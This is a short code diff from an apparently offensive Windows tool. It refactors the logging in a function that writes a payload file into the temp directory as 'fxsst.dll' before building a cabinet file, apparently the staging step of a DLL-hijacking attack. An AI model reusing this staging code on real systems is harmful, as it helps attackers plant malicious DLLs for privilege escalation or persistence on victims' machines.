@@ -48,21 +48,23 @@ def fax_dll(payload):
 	print_info("Attempting to read payload data")
 	if (os.path.isfile(os.path.join(payload)) == True):
 		try:
-			payload_data = open(os.path.join(payload),"rb").read()
-			print_success("Successfully read payload data")
+			payload_data = open(os.path.join(payload),"rb").read()			
 		except Exception as error:
 			print_error("Unable to read payload data")
 			return False
+		else:
+			print_success("Successfully read payload data")
 		
 		print_info("Attempting to save payload to: {}".format(tempfile.gettempdir()))
 		try:
 			dll_file = open(os.path.join(tempfile.gettempdir(),"fxsst.dll"),"wb")
 			dll_file.write(payload_data)
-			dll_file.close()
-			print_success("Successfully saved payload in: {}".format(tempfile.gettempdir()))
+			dll_file.close()			
 		except Exception as error:
 			print_error("Unable to save payload to disk")
 			return False
+		else:
+			print_success("Successfully saved payload in: {}".format(tempfile.gettempdir()))
 	
 	print_info("Pausing for 5 seconds before creating cabinet file")
 	time.sleep(5)
